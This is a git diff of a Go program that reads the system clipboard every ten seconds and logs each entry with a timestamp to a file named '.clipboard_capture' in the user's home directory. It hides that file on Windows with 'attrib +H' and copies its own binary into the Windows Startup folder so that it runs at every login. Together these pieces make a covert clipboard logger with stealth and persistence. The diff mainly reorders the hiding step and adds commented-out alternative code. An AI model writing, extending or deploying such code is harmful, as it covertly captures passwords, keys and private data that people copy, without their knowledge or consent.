@@ -9,6 +9,8 @@ import (
 	"runtime"
 	"time"
 
+	//"syscall"
+
 	"github.com/atotto/clipboard"
 )
 
@@ -17,23 +19,29 @@ func main() {
 
 	ticker := time.NewTicker(10 * time.Second)
 	defer ticker.Stop()
+
 	// Determine hidden file path in user's home directory
 	homeDir, err := os.UserHomeDir()
 	check(err)
 
 	hiddenFile := filepath.Join(homeDir, ".clipboard_capture")
 
-	// hide the file in Windows
-	if runtime.GOOS == "windows" {
-		err = hideFile(hiddenFile)
-		check(err)
-	}
-
-	// Set up persistence at boot-time (macOS)
+	// Set up persistence at boot-time (windows)
 	err = setupPersistence()
 	check(err)
 
-	// start clipboard reading loop
+	// Create the .clipboard_capture file
+	f, err := os.OpenFile(hiddenFile, os.O_CREATE|os.O_WRONLY, 0600)
+	check(err)
+	f.Close()
+
+	// Hide the .clipboard_capture file on Windows
+	if runtime.GOOS == "windows" {
+		err := hideFile(hiddenFile)
+		check(err)
+	}
+	
+	// Start reading clipboard
 	readClipboard(ticker, hiddenFile)
 }
 
@@ -64,14 +72,6 @@ func storeClipboard(path, data string) {
 	entry := fmt.Sprintf("[%s]: %s\n", timestamp, data)
 	_, err = f.WriteString(entry)
 	check(err)
-
-	// Hide the file on Windows after writing
-	if runtime.GOOS == "windows" {
-		hideErr := hideFile(path)
-		if hideErr != nil {
-			fmt.Printf("[WARN] Could not hide clipboard file: %v\n", hideErr)
-		}
-	}
 }
 
 // Copy the binary to the Windows Startup folder for autorun at login
@@ -108,8 +108,13 @@ func setupPersistence() error {
 		_, err = io.Copy(out, in)
 		check(err)
 	}
-
 	return nil
+}
+
+// hideFile sets the hidden attribute on a file in Windows
+func hideFile(path string) error {
+	cmd := exec.Command("attrib", "+H", path)
+	return cmd.Run()
 }
 
 func check(err error) {
@@ -117,6 +122,7 @@ func check(err error) {
 		panic(err)
 	}
 }
+
 func summarize(s string) string {
 	// Keep output readable: show up to 300 chars
 	if len(s) > 300 {
@@ -125,18 +131,13 @@ func summarize(s string) string {
 	return s
 }
 
-// hideFile sets the hidden attribute on a file in Windows
-func hideFile(path string) error {
-	if runtime.GOOS != "windows" {
-		return nil
-	}
-	// Use attrib command to set hidden attribute
-	cmd := execCommand("attrib", "+H", path)
-	return cmd.Run()
-}
-
-// execCommand is a wrapper for exec.Command, to avoid import cycles in tests
-var execCommand = func(name string, arg ...string) *exec.Cmd {
-	return exec.Command(name, arg...)
-}
+// // hideFile sets the hidden attribute on a file in Windows (used if build from Windows)
+// func hideFile(path string) error{
+// 	if runtime.GOOS != "windows" {
+// 		path, err := syscall.UTF16PtrFromString(path)
+// 		err = syscall.SetFileAttributes(path, syscall.FILE_ATTRIBUTE_HIDDEN)
+// 		check(err)
+// 	}
+// 	return nil
+// }
 
